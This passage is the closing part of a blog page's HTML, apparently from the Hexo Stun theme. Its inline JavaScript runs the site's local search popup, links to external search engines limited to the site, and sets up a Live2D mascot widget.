              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'Please enter characters');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>